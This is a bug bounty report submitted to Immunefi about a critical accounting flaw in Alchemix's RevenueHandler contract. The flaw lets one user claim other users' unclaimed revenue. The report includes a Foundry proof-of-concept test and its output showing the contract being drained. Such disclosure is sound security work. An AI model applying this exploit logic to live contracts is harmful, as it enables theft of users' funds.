# 31077 - \[SC - Critical] RevenueHandler counts unclaimed tokens as new r...

Submitted on May 12th 2024 at 11:02:22 UTC by @Holterhus for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31077

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

The `RevenueHandler` contract has a `checkpoint()` function that records revenue amounts for each token in each epoch. There is a mistake in the logic of non-alchemic tokens, because it assumes the entire token balance is new revenue for the epoch. This is wrong because the token balance includes pending revenue from previous epochs that have not yet been claimed. This allows users to claim more tokens than they should, which steals tokens from other users who try to claim later.

## Vulnerability Details

The `checkpoint()` function in `RevenueHandler` contains the following code snippet:

```solidity
uint256 thisBalance = IERC20(token).balanceOf(address(this));

// If poolAdapter is set, the revenue token is an alchemic-token
if (tokenConfig.poolAdapter != address(0)) {
    // Treasury only receives revenue if the token is an alchemic-token
    treasuryAmt = (thisBalance * treasuryPct) / BPS;
    IERC20(token).safeTransfer(treasury, treasuryAmt);

    // Only melt if there is an alchemic-token to melt to
    amountReceived = _melt(token);

    // Update amount of alchemic-token revenue received for this epoch
    epochRevenues[currentEpoch][tokenConfig.debtToken] += amountReceived;
} else {
    // If the revenue token doesn't have a poolAdapter, it is not an alchemic-token
    amountReceived = thisBalance;

    // Update amount of non-alchemic-token revenue received for this epoch
    epochRevenues[currentEpoch][token] += amountReceived;
}
```

Notice that in the `else` case, the `epochRevenues[currentEpoch][token]` amount is incremented by the current token balance. As mentioned above, this is incorrect because the token balance also contains unclaimed revenue from previous epochs. Due to this mistake, the revenues past the first epoch will be inflated, which leads to an inflated `totalClaimable` value in the `_claimable()` function:

```solidity
uint256 epochTotalVeSupply = IVotingEscrow(veALCX).totalSupplyAtT(epochTimestamp);
if (epochTotalVeSupply == 0) continue;
uint256 epochRevenue = epochRevenues[epochTimestamp][token];
uint256 epochUserVeBalance = IVotingEscrow(veALCX).balanceOfTokenAt(tokenId, epochTimestamp);
totalClaimable += (epochRevenue * epochUserVeBalance) / epochTotalVeSupply;
```

## Impact Details

Once an epoch has an inflated revenue, a malicious user can call `claim()` to take a large amount of tokens they do not deserve. This is a theft of other users' unclaimed yield. Since the malicious user would receive the tokens, no tokens would be left in the `RevenueHandler` for the other users to claim. See the PoC for an example.

## References

See the PoC below.

## Proof of Concept

I have created the following test case that can be added to `RevenueHandler.t.sol`:

```solidity
function testNonAlchemicRevenueAccountingBug() external {
    uint256 revAmt = 1000e18;
    uint256 tokenId1 = _initializeVeALCXPosition(10e18);
    uint256 tokenId2 = _setupClaimableNonAlchemicRevenue(revAmt, bal);

    _jumpOneEpoch();
    revenueHandler.checkpoint();

    console.log("claimable 1 before:", revenueHandler.claimable(tokenId1, bal));
    console.log("claimable 2 before:", revenueHandler.claimable(tokenId2, bal));
    console.log("revenueBalance before:", IERC20(bal).balanceOf(address(revenueHandler)));

    revenueHandler.claim(tokenId1, bal, address(0), revenueHandler.claimable(tokenId1, bal), address(this));

    console.log("claimable 1 after:", revenueHandler.claimable(tokenId1, bal));
    console.log("claimable 2 after:", revenueHandler.claimable(tokenId2, bal));
    console.log("revenueBalance after:", IERC20(bal).balanceOf(address(revenueHandler)));

    uint256 claimable2 = revenueHandler.claimable(tokenId2, bal);
    vm.expectRevert("Not enough revenue to claim");
    revenueHandler.claim(tokenId2, bal, address(0),claimable2, address(this));
}
```

Running the command `forge test -vvv --match-test testNonAlchemicRevenueAccountingBug --rpc-url $ETH_RPC_URL` gives the following result:

```
[PASS] testNonAlchemicRevenueAccountingBug() (gas: 2569923)
Logs:
  claimable 1 before: 1000000000000000000000
  claimable 2 before: 1000000000000000000000
  revenueBalance before: 1000000000000000000000
  claimable 1 after: 0
  claimable 2 after: 1000000000000000000000
  revenueBalance after: 0
```

This shows that the first user can claim 100% of the tokens, preventing the second user from claiming anything.
